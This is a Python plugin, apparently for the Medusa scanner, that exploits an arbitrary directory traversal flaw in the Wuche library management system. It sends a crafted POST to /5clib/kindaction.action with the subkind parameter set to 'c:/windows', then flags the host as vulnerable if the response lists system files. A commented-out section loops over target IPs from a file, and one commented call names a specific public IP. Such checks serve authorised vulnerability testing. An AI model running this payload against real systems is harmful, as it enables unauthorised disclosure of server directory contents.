#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 五车图书管系统kindaction任意文件遍历
referer: http://www.wooyun.org/bugs/wooyun-2010-0128686
author: Lucifer
description: 文件kindaction.action中,参数subkind存在任意文件遍历。
'''

import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


post_data = {
    "filePath": "",
    "kind": "music",
    "curpage": 1,
    "actionName": "",
    "subkind": "c:/windows",
    "pagesize": 20,
    "curPage": 1,
    "toPage": 1
}
payload = "/5clib/kindaction.action"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if code==200 and con.lower().find('system')!=-1:
            Medusa = "{} 存在五车图书管系统kindaction任意文件遍历漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass
#if __name__ == '__main__':
    # with open('1.txt', 'r') as f:
    #     for ip in f.readlines():
    #         ip = ip.strip()
    #         audit(assign('WWW', str(ip))[1])
    #medusa('54.37.131.33:8888',"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",'')